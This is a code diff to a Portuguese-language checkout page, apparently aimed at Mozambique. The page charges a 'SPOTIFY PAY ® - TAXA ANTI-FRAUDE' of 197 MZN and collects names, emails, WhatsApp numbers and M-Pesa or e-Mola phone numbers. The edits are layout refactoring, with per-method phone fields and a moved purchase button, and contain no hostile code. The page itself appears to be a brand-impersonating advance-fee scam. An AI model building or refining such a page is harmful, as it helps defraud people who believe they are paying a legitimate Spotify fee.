@@ -47,37 +47,44 @@
       padding: 0 16px 40px;
     }
 
-    /* Header do Produto */
-    .product-header {
-      background: white;
-      padding: 20px;
+    /* Banner */
+    .banner-image {
+      width: 100%;
+      max-width: 520px;
       border-radius: 12px;
       margin-bottom: 16px;
       box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+    }
+
+    /* Header do Produto dentro da Identificação */
+    .product-info {
       display: flex;
       align-items: center;
       gap: 16px;
+      padding-bottom: 20px;
+      margin-bottom: 20px;
+      border-bottom: 1px solid #e0e0e0;
     }
 
-    .product-header img {
+    .product-info img {
       width: 70px;
       height: 70px;
       border-radius: 8px;
       object-fit: cover;
     }
 
-    .product-header .info {
+    .product-info .info {
       flex: 1;
     }
 
-    .product-header .info .name {
+    .product-info .info .name {
       font-weight: 600;
       font-size: 16px;
       color: #191414;
       margin-bottom: 6px;
     }
 
-    .product-header .info .price {
+    .product-info .info .price {
       font-weight: 700;
       color: #1DB954;
       font-size: 24px;
@@ -232,6 +239,18 @@
     .phone-field {
       margin-top: 16px;
       display: none;
+      padding-top: 12px;
+    }
+
+    .phone-field-mpesa,
+    .phone-field-emola {
+      display: none;
+      padding-top: 12px;
+    }
+
+    /* Botão Container */
+    .btn-container {
+      margin-bottom: 16px;
     }
 
     /* Informações de Segurança */
@@ -409,8 +428,9 @@
         padding: 20px 16px;
       }
 
-      .product-header {
-        padding: 16px;
+      .product-info {
+        padding-bottom: 16px;
+        margin-bottom: 16px;
       }
     }
   </style>
@@ -421,17 +441,19 @@
   </div>
 
   <div class="container">
-    <!-- Header do Produto -->
-    <div class="product-header">
-      <img src="images/spoti.png" alt="Spotify Pay" />
-      <div class="info">
-        <div class="name">SPOTIFY PAY ® - TAXA ANTI-FRAUDE</div>
-        <div class="price">197,00 MZN</div>
-      </div>
-    </div>
+    <!-- Banner -->
+    <img src="images/transferir.png" alt="Banner" class="banner-image" />
 
     <!-- Seção 1: Identificação -->
     <div class="section-container">
+      <!-- Header do Produto -->
+      <div class="product-info">
+        <img src="images/spoti.png" alt="Spotify Pay" />
+        <div class="info">
+          <div class="name">SPOTIFY PAY ® - TAXA ANTI-FRAUDE</div>
+          <div class="price">197,00 MZN</div>
+        </div>
+      </div>
       <div class="section-header">
         <div class="section-number">1</div>
         <div class="section-title">Identifique-se</div>
@@ -466,26 +488,41 @@
       <div class="payment-subtitle">Todas as transações são seguras e criptografadas.</div>
 
       <div class="payment-options">
-        <div class="payment-option" onclick="selectPayment(this, 'mpesa')">
+        <div class="payment-option" id="mpesa-option" onclick="selectPayment(this, 'mpesa')">
           <div class="payment-radio"></div>
           <img src="images/mpesa.png" alt="M-Pesa" class="payment-logo" />
           <div class="payment-name">M-Pesa</div>
         </div>
 
-        <div class="payment-option" onclick="selectPayment(this, 'emola')">
+        <div class="phone-field-mpesa" id="phone-section-mpesa">
+          <div class="form-group">
+            <label for="phone-input-mpesa">Número de celular*</label>
+            <input id="phone-input-mpesa" type="text" placeholder="84/85 xxxxxx" />
+            <div id="phone-erro-mpesa" class="error-message">Por favor, insira o número de telefone M-Pesa.</div>
+          </div>
+        </div>
+
+        <div class="payment-option" id="emola-option" onclick="selectPayment(this, 'emola')">
           <div class="payment-radio"></div>
           <img src="images/emola.png" alt="e-Mola" class="payment-logo" />
           <div class="payment-name">e-Mola</div>
         </div>
-      </div>
 
-      <div class="phone-field" id="phone-section">
-        <div class="form-group">
-          <label for="phone-input">Número de celular*</label>
-          <input id="phone-input" type="text" placeholder="84/85/86/87 xxxxxx" />
-          <div id="phone-erro" class="error-message">Por favor, insira o número de telefone.</div>
+        <div class="phone-field-emola" id="phone-section-emola">
+          <div class="form-group">
+            <label for="phone-input-emola">Número de celular*</label>
+            <input id="phone-input-emola" type="text" placeholder="86/87 xxxxxx" />
+            <div id="phone-erro-emola" class="error-message">Por favor, insira o número de telefone e-Mola.</div>
+          </div>
         </div>
       </div>
+    </div>
+
+    <!-- Botão de Compra -->
+    <div class="btn-container">
+      <button class="btn-purchase" id="pagar-btn">
+        <span>🔒</span> Finalizar compra! MT 197,00
+      </button>
     </div>
 
     <!-- Informações de Segurança -->
@@ -522,11 +559,6 @@
         </div>
       </div>
     </div>
-
-    <!-- Botão de Compra -->
-    <button class="btn-purchase" id="pagar-btn">
-      <span>🔒</span> Finalizar compra! MT 197,00
-    </button>
 
     <!-- Footer -->
     <div class="footer">
@@ -565,13 +597,26 @@
     let orderIdUnico = gerarOrderId();
     console.log('🆔 Order ID gerado:', orderIdUnico);
 
+    let currentMethod = null;
+
     function selectPayment(el, method) {
       document.querySelectorAll('.payment-option').forEach(opt => opt.classList.remove('selected'));
       el.classList.add('selected');
-      document.getElementById('phone-section').style.display = 'block';
-      const phoneInput = document.getElementById('phone-input');
-      phoneInput.dataset.metodo = method;
-      phoneInput.placeholder = method === 'mpesa' ? 'EX: 84/85 xxxxxx' : 'EX: 86/87 xxxxxx';
+
+      currentMethod = method;
+
+      const mpesaField = document.getElementById('phone-section-mpesa');
+      const emolaField = document.getElementById('phone-section-emola');
+
+      if (method === 'mpesa') {
+        mpesaField.style.display = 'block';
+        emolaField.style.display = 'none';
+        document.getElementById('phone-input-emola').value = '';
+      } else if (method === 'emola') {
+        emolaField.style.display = 'block';
+        mpesaField.style.display = 'none';
+        document.getElementById('phone-input-mpesa').value = '';
+      }
     }
 
     function mostrarPopup(tipo, mensagem) {
@@ -591,16 +636,20 @@
     document.getElementById('pagar-btn').addEventListener('click', async () => {
       const nome = document.getElementById('nome-input');
       const email = document.getElementById('email-input');
-      const phone = document.getElementById('phone-input');
       const whatsapp = document.getElementById('whatsapp-input');
-      const metodo = phone.dataset.metodo;
+      const metodo = currentMethod;
       const pagarBtn = document.getElementById('pagar-btn');
       let erro = false;
 
-      [nome, email, phone, whatsapp].forEach(input => input.classList.remove('error'));
+      const phoneMpesa = document.getElementById('phone-input-mpesa');
+      const phoneEmola = document.getElementById('phone-input-emola');
+      const phone = metodo === 'mpesa' ? phoneMpesa : phoneEmola;
+
+      [nome, email, phoneMpesa, phoneEmola, whatsapp].forEach(input => input.classList.remove('error'));
       document.getElementById('nome-erro').style.display = 'none';
       document.getElementById('email-erro').style.display = 'none';
-      document.getElementById('phone-erro').style.display = 'none';
+      document.getElementById('phone-erro-mpesa').style.display = 'none';
+      document.getElementById('phone-erro-emola').style.display = 'none';
       document.getElementById('whatsapp-erro').style.display = 'none';
 
       if (!nome.value.trim()) {
@@ -624,7 +673,11 @@
       const numeroValido = validarNumero(numero, metodo);
       if (!numeroValido || !metodo) {
         phone.classList.add('error');
-        document.getElementById('phone-erro').style.display = 'block';
+        if (metodo === 'mpesa') {
+          document.getElementById('phone-erro-mpesa').style.display = 'block';
+        } else {
+          document.getElementById('phone-erro-emola').style.display = 'block';
+        }
         erro = true;
       }
 
